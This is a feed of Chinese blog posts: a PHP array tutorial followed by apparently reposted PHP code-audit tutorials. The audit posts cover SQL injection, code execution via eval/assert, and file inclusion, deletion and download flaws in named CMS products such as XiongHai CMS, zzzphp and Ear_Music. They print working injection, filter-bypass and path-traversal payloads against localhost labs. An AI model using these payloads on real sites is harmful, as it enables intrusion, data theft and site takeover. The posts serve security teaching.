alt="没有查找到值"></p><p>②通过键查找 值</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token delimiter">?></span></code></pre><p>这样就可以查找到了<br><img src="https://img-blog.csdnimg.cn/20200411213118492.png" alt></p><h5 id="5-数组中的-“改”"><a href="#5-数组中的-“改”" class="headerlink" title="5) 数组中的 “改”"></a>5) 数组中的 “改”</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"boke"</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里的修改，其实就是在查询的基础上 重新赋值一下就可以了</p><h3 id="数组的的一些其他操作"><a href="#数组的的一些其他操作" class="headerlink" title="数组的的一些其他操作"></a>数组的的一些其他操作</h3><p><strong>获取数组的最后一个元素 <code>array_pop()</code></strong><br>array_pop 函数返回数组的最后一个值，并且数组长度减 1，如果数组为空，或者不是数组，则返回 null</p><p>array_pop(array)<br>这里的array 其实就是 定义的那个要获取的数组</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br> 被弹出的函数：$array"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200411214811251.png" alt></p><p>除了上面这些常用的操作，还有 联合使用 <code>list()，each()，while()</code> 遍历数组</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入审计</title>
      <link href="/2020/040134002.html"/>
      <url>/2020/040134002.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>为什么第一章我们学习，因为看这篇文章的朋友大概也看过我前面写的MySQL_wiki系列，这里来SQL注入的话我们能方便理解，同时sql注入也是审计中我们经常想要找到的，比较以来就getshell什么的也不现实这种漏洞也不多。</p><h1 id="0x01-字符型注入"><a href="#0x01-字符型注入" class="headerlink" title="0x01 字符型注入"></a>0x01 字符型注入</h1><p>这里我们看到sqli-libs第一关的代码</p><pre><code>&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variables if(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }    else     {    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;</code></pre><p>我们可以看到调用<code>$_GET[&#39;id&#39;]</code>获取参数内容，没有经过任何过来带入了SQL语句的查询，也就是代码没有任何过来且没开魔术引号，那么将会形成注入，如果开启魔术引号遇到数字型的我们还是能够注入的，因为<code>magic_quotes_gpc</code>只会转义单引号、双引号、反斜线、NULL，但是数字型注入我们可以不试用到这些。</p><pre><code>http://127.0.0.1/sqli/Less-1/?id=-1%27union%20select%201,user(),3--%20+</code></pre><h1 id="0x02-编码类注入"><a href="#0x02-编码类注入" class="headerlink" title="0x02 编码类注入"></a>0x02 编码类注入</h1><p>有些为了业务需要他会把传入一些编码后的参数再解码带入数据库查询，我们常见的有base64编码，也有的程序会内置url解码，这类写法通常见于框架。</p><p>1.base64</p><pre><code>&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=base64_decode($_GET[&#39;id&#39;]);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if ($row) {    echo &quot;id:&quot;.$row[&#39;id&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;用户名:&quot;.$row[&#39;username&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;密码:&quot;.$row[&#39;password&#39;].&quot;&lt;br&gt;&quot;;}else{    print_r(mysql_error());}echo &#39;&lt;hr&gt;&#39;;echo &quot;查询的语句是：$sql&quot;;?&gt;</code></pre><p>传入的值base64解密后带入查询，这种注入魔术引号是没办法拦截的，当我们遇到网站为base64编码的参数时可以留意下。</p><pre><code>http://127.0.0.1/sqli/Less-1/base64.php?id=JyB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyAtLSAr</code></pre><p>2.urldecode</p><pre><code>&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=urldecode($_GET[&#39;id&#39;]);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if ($row) {    echo &quot;id:&quot;.$row[&#39;id&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;用户名:&quot;.$row[&#39;username&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;密码:&quot;.$row[&#39;password&#39;].&quot;&lt;br&gt;&quot;;}else{    print_r(mysql_error());}echo &#39;&lt;hr&gt;&#39;;echo &quot;查询的语句是：$sql&quot;;?&gt;</code></pre><p>因为接受的参数只会被url解码一次，传入的值不是魔术引号认识的值所以可以绕过</p><pre><code>http://127.0.0.1/sqli/Less-1/base64.php?id=%2527union%20select%201,user(),3--%20+</code></pre><h1 id="0x03-宽字节注入"><a href="#0x03-宽字节注入" class="headerlink" title="0x03 宽字节注入"></a>0x03 宽字节注入</h1><pre><code>&lt;?php$conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);mysql_select_db(&quot;security&quot;,$conn);mysql_query(&quot;set names &#39;gbk&#39; &quot;,$conn);$id=urldecode($_GET[&#39;id&#39;]);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if ($row) {    echo &quot;id:&quot;.$row[&#39;id&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;用户名:&quot;.$row[&#39;username&#39;].&quot;&lt;br&gt;&quot;;    echo &quot;密码:&quot;.$row[&#39;password&#39;].&quot;&lt;br&gt;&quot;;}else{    print_r(mysql_error());}echo &#39;&lt;hr&gt;&#39;;echo &quot;查询的语句是：$sql&quot;;?&gt;</code></pre><p>网上有很多解释大家可以搜索一下我这里就不详细介绍了大概原因就是:</p><p>id=1’-&gt;id=1&#39;-&gt;id=1%5c%27</p><p>id=1%df’-&gt;id=1%df%5c%27-&gt;id=1%DF5C%27-&gt;id=1運’</p><p>当然还有其他各种类型的注入这里就不一一列举了，看了mysql系列文章的大概都知道，不知道的可以看看。</p><h1 id="0x04-过滤"><a href="#0x04-过滤" class="headerlink" title="0x04 过滤"></a>0x04 过滤</h1><p>通常情况下一个成熟的cms是不存在不过滤的情况，一般的程序选择用函数来过滤比如<code>addslashes()</code>，也可以开启魔术引号，但是更多的程序它采用正则匹配来过滤，<br>使用不正确的匹配替换方式反而导致被绕过的机会更大，比如有的程序把<code>union</code> 替换为空，那么我们就可以双写<code>ununionion</code>绕过从而还可能绕过外部WAF,对于整数型一般采用<code>intval()</code>等字符转换，后期通过实战一步一步讲解。</p><h1 id="0x05-实战审计"><a href="#0x05-实战审计" class="headerlink" title="0x05 实战审计"></a>0x05 实战审计</h1><p>找了半天源码，还是用这款熊海CMS V1.0吧，这款CMS感觉不错，什么洞都有，非常适合我们学习审计，同时审计这个cms的文章很多，大家如果觉得我写的不如人意，还能看看别人。</p><p>首先我们审计对传入的参数如果想快速的看是否有全局过滤，不妨找个文件输出一下<code>$_POST</code>、<code>$_GET</code>等等。</p><pre><code>echo $_POST[&#39;b&#39;];echo $_GET[&#39;a&#39;];</code></pre><p><img src="https://img-blog.csdnimg.cn/20200401193112186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>没有全局过滤 我们来到后台登陆文件admin/files/login.php 看看login.php一般登陆存在注入的可能性还是很大的</p><p><img src="https://img-blog.csdnimg.cn/20200401193137702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>很明显 带入查询的user没有经过任何过滤，同时输出了错误，所以可以用报错查询，当然你也选择万能密码。</p><p>payload:</p><pre><code>user=1111&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- +&amp;password=111&amp;login=yes</code></pre><p><img src="https://img-blog.csdnimg.cn/20200401193211841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>在看看留言板 files/submit.php </p><p><img src="https://img-blog.csdnimg.cn/20200401193236645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>传入参数没有过滤</p><p><img src="https://img-blog.csdnimg.cn/20200401193257375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>同时插入的时候，这里使用了<code>mysql_error()</code>所以可以用报错注入，否则只能使用盲注了。</p><p><img src="https://img-blog.csdnimg.cn/20200401193314316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>payload:</p><pre><code>cid=0&amp;name=&#39;or updatexml(1,concat(0x7e,(version())),0) or&#39;&amp;mail=1111&amp;url=http%3A%2F%2F1&amp;content=%E9%98%BF%E5%BE%B7&amp;save=%E6%8F%90%E4%BA%A4&amp;randcode=&amp;jz=1&amp;tz=1</code></pre><p>开始我们说过不是使用了过滤函数就万事大吉了，数字型注入可以不使用引号</p><p><img src="https://img-blog.csdnimg.cn/20200401193333135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>我们看到传入的<code>cid</code>已经被<code>addslashes()</code>函数转义了，查询的地方都没啥问题，但是到浏览计数的时候调用了它，那么我们就可以使用盲注或者报错注入了，因为有错误回显。</p><p>payload：</p><pre><code>http://127.0.0.1/xhcms/?r=content&amp;cid=1%20and%20If(ascii(substr(database(),1,1))%3C10,0,sleep(10))</code></pre><p>这个系统还有其他注入，想练手的自己下载审计一下，总体思路有用户交互的地方都有可能存在注入，这也是我们没有通读代码的一个审计思路。</p><p>就可以使用盲注或者报错注入了，因为有错误回显。</p><p>payload：</p><pre><code>http://127.0.0.1/xhcms/?r=content&amp;cid=1%20and%20If(ascii(substr(database(),1,1))%3C10,0,sleep(10))</code></pre><p>这个系统还有其他注入，想练手的自己下载审计一下，总体思路有用户交互的地方都有可能存在注入，这也是我们没有通读代码的一个审计思路。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初始代码审计</title>
      <link href="/2020/040144396.html"/>
      <url>/2020/040144396.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>终于来到了代码审计篇章。希望看了朋友有所收获，我们通常把代码审计分为黑盒和白盒，我们一般结合起来用。</p><p>通常我们白盒审计有多种方法我们可以归纳为：</p><p>1.通读全文</p><p>2.回溯</p><p>其中通读全文费时间，但是有利于代码审计的经验积累，也能更深入的挖掘一些难以发现的漏洞。功能回溯我们可以定向的审计一些功能和函数，最常见的就是对命令执行函数的回溯，和上传等功能的审计。通过熟悉白盒审计有利于漏洞的发掘，因为代码审计和开发都能熟悉到程序中那些地方会存在对数据库的操作和功能函数的调用，举个简单的例子当我们看到download的时候，我们就会想到是不是有任意文件下载。</p><h1 id="0x01-环境与工具"><a href="#0x01-环境与工具" class="headerlink" title="0x01 环境与工具"></a>0x01 环境与工具</h1><p>我们在代码审计中又可以分为静态和动态，静态我们通常用于无法搭建原来的环境只能看代码逻辑来判断是否存在漏洞，而动态调试就可以debug、输出、监控SQL语句来看非常方便。</p><p>接下来代码审计工具基本就用到Sublime Text 3、VSCode、Seay源代码审计系统、PHPStorm+XDebug、文件对比、MYSQL监控、编码转换、正则调试等。其中文件对比工具可以拿来和更新补丁后的文件进行对于对比定位漏洞代码区，PHPStorm+XDebug可以动态调试定位漏洞成因,也有利于漏洞的发掘。当然你也可以用那些自动化审计的，貌似还支持代码回溯，还是能审计到一些漏洞的。环境能用基本就用phpstudy了。</p><h1 id="0x02-知识准备"><a href="#0x02-知识准备" class="headerlink" title="0x02 知识准备"></a>0x02 知识准备</h1><p>代码审计我们需要对php有一定的了解，当然是越深入越好，我们也不纠结，代码审计需不需要精通php什么的，只能说知识面在什么层次就能审计到什么层次的漏洞，但是至少你得看得懂代码。</p><p>我们应该具备一些知识：</p><p>1.基本的正则</p><p>2.数据库的一些语法(这个我在前面的数据库维基已经讲的差不多了)</p><p>3.至少你得看懂php代码</p><p>4.php配置文件以及常见函数</p><h1 id="0x03-关于文章的一些问题"><a href="#0x03-关于文章的一些问题" class="headerlink" title="0x03 关于文章的一些问题"></a>0x03 关于文章的一些问题</h1><p>前面我们的实验环境我基本上不会使用框架类的，我尽量使用一些很普通的网站，还有如何用phpstudy之类的来本地搭建网站这些我也不会讲，这些基础的问题搜索一下就有，不能独立解决问题怎么能进步，遇到一些特殊的问题我还是会说一下的。</p><h1 id="0x04-文末"><a href="#0x04-文末" class="headerlink" title="0x04 文末"></a>0x04 文末</h1><p>当然如果你跟我一样是一个新手才入门代码审计，看这篇文章最好不过了，因为我会讲的很细,当然我可能很多东西也讲不到，还请大家多看看别人的审计思路，只有不断的学习才有提高。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码执行审计</title>
      <link href="/2020/040117605.html"/>
      <url>/2020/040117605.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>本文章来自 公众号：404安全</p><p>代码执行也是我们经常遇到的，通常是<code>eval()</code>、<code>assert()</code>，当然还有回调函数比如<code>call_user_func()</code> <code>array_map()</code>，正则函数，动态调用等等，因为程序对传入的参数过滤不严或者没有过滤，导致代码执行，看过我前面写的php的webshell总结的话，你就会发现很多知识是相辅相成的。</p><h1 id="0x01-代码执行"><a href="#0x01-代码执行" class="headerlink" title="0x01 代码执行"></a>0x01 代码执行</h1><p>这里说说eval的命令执行，assert在php7后面移除了。我们来看一个简单的eval代码执行</p><p>test.php</p><pre><code>&lt;?$id = $_GET[&#39;x&#39;];eval($id);?&gt;</code></pre><p>payload:</p><pre><code>test.php?x=phpinfo();</code></pre><p>简单到waf以为他是个webshell了，当然我们实际情况肯定遇不到这么简单的，可能需要多重组合利用，这里下面我以一个实例为例</p><h1 id="0x02-实战审计"><a href="#0x02-实战审计" class="headerlink" title="0x02 实战审计"></a>0x02 实战审计</h1><p>这里使用的是zzzphp V1.6.0的一个解析标签过程中引发的代码执行，网上也有其他人的审计思路，这里我是帮朋友复现的时候弄的。</p><p>找个的审计思路是全局搜索eval，当然你也可以搜索其他的能够引发代码执行的函数，但是这个这-1里没有。</p><p>路径：\inc\zzz_template.php</p><p><img src="https://img-blog.csdnimg.cn/20200401193557897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>我们发现eval里面有变量，那么他是可能存在代码执行的</p><p><img src="https://img-blog.csdnimg.cn/20200401193615536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>大概看了下<code>parserIfLabel()</code> 函数没有什么过滤，能够达到我们传入任意参数的目的，到了这里我们就是回溯那里调用了这个函数呗，全局搜索下<code>parserIfLabel()</code>，没搜索到，看了下是个类，所以搜索类名<code>ParserTemplate</code>。</p><p><img src="https://img-blog.csdnimg.cn/20200401193815661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-VTMMnJQY-1585740849166)(./img/1.3.3.png)\]"></p><p>既然 \admin\save.php 调用了我们这个，不妨看看后台那里有模板操作这个</p><p><img src="https://img-blog.csdnimg.cn/2020040119370038.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt><br>当然完全你也可以回溯代码去分析，但是既然有源码能看就看。</p><p><img src="https://img-blog.csdnimg.cn/2020040119370038.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>随便找个文件放入我们遵循他正则的代码即可，不过一般我们测试的过程中，尽量选择对目标影响小的文件。</p><p>payload：</p><pre><code>{if:assert(phpinfo())}x{end if}</code></pre><p>响小的文件。</p><p>payload：</p><pre><code>{if:assert(phpinfo())}x{end if}</code></pre><p>于此同类的还有苹果cms8.x，都是在解析标签过程中出现的问题，一般看到可以自定义解析标签那么就值得注意，命令执行与此类似，这里就不说了。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件操作审计</title>
      <link href="/2020/040155793.html"/>
      <url>/2020/040155793.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章来自 公众号：404安全</p><h1 id="0x00-文件包含"><a href="#0x00-文件包含" class="headerlink" title="0x00 文件包含"></a>0x00 文件包含</h1><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>本地文件包含（Local File Include）简称 LFI，文件包含在php中，一般涉及到的危险函数有<code>include()</code>、<code>include_once()</code>、<code>require()</code>、<code>require_once()</code>，在包含文件名中存在可控变量的话就可能存在包含漏洞，由于这几个函数的特性也可能产生其他漏洞，后面一一讲到。</p><p>示例：</p><pre><code>&lt;?php    $file = $_GET[&#39;name&#39;];    include($file);?&gt;</code></pre><p>payload:</p><pre><code>http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini</code></pre><p>这是个最简单的文件包含，没有任何过滤。但是一般程序不会这么写，一般会指定后缀，这样我们就需要截断来绕过了。</p><pre><code>&lt;?php    $file = $_GET[&#39;name&#39;];    include($file . &quot;html&quot;);?&gt;</code></pre><p>在PHP5.2.x中我们可以通过使用%00来截断后面的内容、也可以使用路径长度截断，不过都在php5.3中被修复了。</p><p>payload：</p><pre><code>http://127.0.0.1/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini%00</code></pre><p><img src="https://img-blog.csdnimg.cn/2020040119452140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>利用字符.或者/.或者./来截断。系统文件路径长度限制：<br><code>windows: 259个bytes</code><br><code>linux: 4096个bytes</code></p><h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>远程文件包含漏洞(Remote File Inclusion)简称RFI，他需要我们的php.ini中配置<code>allow_url_include</code>、 <code>allow_url_fopen</code>。</p><p>1.包含远程文件 </p><p>需要打开<code>allow_url_include=On</code>、 <code>allow_url_fopen = On</code></p><p><img src="https://img-blog.csdnimg.cn/20200401194619186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>他可以利用?号截断，不受版本限制</p><p>payload：</p><pre><code>http://127.0.0.1/test.php?name=http://127.0.0.1/1.txt?</code></pre><p>2.伪协议</p><pre><code>file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流</code></pre><p>各种伪协议的使用方法网上很多，大家搜索一下吧。</p><h3 id="实战审计"><a href="#实战审计" class="headerlink" title="实战审计"></a>实战审计</h3><p>直接看主页index.php</p><pre><code>&lt;?php//单一入口模式error_reporting(0); //关闭错误显示$file=addslashes($_GET[&#39;r&#39;]); //接收文件名$action=$file==&#39;&#39;?&#39;index&#39;:$file; //判断为空或者等于indexinclude(&#39;files/&#39;.$action.&#39;.php&#39;); //载入相应文件?&gt;</code></pre><p>他会包含files目录下的文件，因为他没有过滤../所以可以包含任意目录下的文件，由于加了后缀所以漏洞存在于低版本php。</p><p><img src="https://img-blog.csdnimg.cn/20200401194717587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><h1 id="0x01-任意文件删除"><a href="#0x01-任意文件删除" class="headerlink" title="0x01 任意文件删除"></a>0x01 任意文件删除</h1><p>任意文件删除审计一般来说我们都是搜索函数<code>unlink</code> 然后回溯去看。</p><p>inc\zzz_file.php</p><p><img src="https://img-blog.csdnimg.cn/20200401194734414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>首先判断传入的参数是否为空，然后拼接路径，第516行中出现了一个函数<code>ifstrin</code>,我们跟进看看</p><p><img src="https://img-blog.csdnimg.cn/20200401194750581.png#pic_center" alt></p><p>只是个简单的判断没啥特殊情况，我们再来看看拿来调用了这个文件。</p><p><img src="https://img-blog.csdnimg.cn/20200401194806476.png#pic_center" alt></p><pre><code>function file_path( $path ) {    $list=array();    $path= substr( $path, 0, strrpos( $path, &#39;/&#39; ));    $list=splits($path,&#39;/&#39;);    return $list;}function arr_search($arr1, $arr2 ) {    $result=false;    foreach ( $arr1 as $v ) {       if(in_array( $v,$arr2 )) return true;            }    return $result;}</code></pre><p>获取参数，然后看看我们传入的路径是否存在这个数组里面的值，也就是基本上是没有过滤的，因为我们完全可以通过../ 跳回去。</p><p>payload：</p><pre><code>POST /zzzp6p/admin/save.php?act=delfilepath=/zzzp6p/upload/../install/1install.lock</code></pre><p>这里我们走的下面的分支不能删除 <code>array( &#39;php&#39;, &#39;db&#39;, &#39;mdb&#39;, &#39;tpl&#39; )</code> 这个数组的文件。</p><p>要删除任意文件只需要使用</p><pre><code>path=/zzzp6p/runtime/../install/1.db</code></pre><p>让<code>ifstrin()</code>为true走上面的分支即可。</p><p>一般来说我们任意文件删除 是配合删除install.lock来达到网站重装漏洞。</p><h1 id="0x02-任意文件下载"><a href="#0x02-任意文件下载" class="headerlink" title="0x02 任意文件下载"></a>0x02 任意文件下载</h1><p>任意文件下载常见于文件的显示和下载的地方，一般关注的文件是和下载有关的，比如download。当然你还可以搭建源码，来寻找能够下载的地方。</p><p>常见的下载或读取函数: <code>file_get_contents()</code>、<code>readfile()</code> 、<code>fopen()</code></p><p>在网上找到个别人审计的实例，结合起来审计一下，用到的源码是Ear_Music_20180820_UTF8</p><p>搜索down相关的词语，找到文件\template\default\source\down.php</p><p><img src="https://img-blog.csdnimg.cn/20200401194851115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>我们看看<code>$file</code>参数怎么来的,先是调用函数<code>getfield()</code>,转到函数去看看</p><p><img src="https://img-blog.csdnimg.cn/20200401194905942.png#pic_center" alt></p><p>不出意外应该是从数据库中读取路径，再来看看<code>geturl()</code>函数</p><p><img src="https://img-blog.csdnimg.cn/20200401194926435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>构造下载地址，这些地方没什么问题，我们来看看什么地方对储存地址的表中插入了数据，搜索表名<code>lyric</code>。</p><p>\source\user\music\ajax.php</p><p><img src="https://img-blog.csdnimg.cn/20200401194958596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>我们看到<code>$lyric</code>经过 <code>checkrename</code>、 <code>SafeRequest</code>这两个函数的清洗，先来转到函数<code>SafeRequest</code>。</p><p><img src="https://img-blog.csdnimg.cn/20200401195016316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>我们传入的mode是get，然后经过<code>addslashes()</code>的转义，下面在替换为空，也就是我们基本上是不能使用<code>\\</code>了，我们在看看<code>checkrename</code></p><p><img src="https://img-blog.csdnimg.cn/20200401195040468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70#pic_center" alt></p><p>这里正则匹配了我们的</p><pre><code>.\ ?iframe=.php?</code></pre><p>这里完全看不懂他匹配后缀为php?这个的意义何在，直接php就绕过了。</p><p>所以综合起来就是不要带有<code>\ 和 ./</code> 这里我们只要传入绝对路径就可以了</p><p>登陆前台找到上传歌曲的页面在歌词地址中插入payload</p><p>payload：</p><pre><code>D:/phpstudy/PHPTutorial/WWW/Ear_Music/template/default/source/down.php</code></pre><p><img 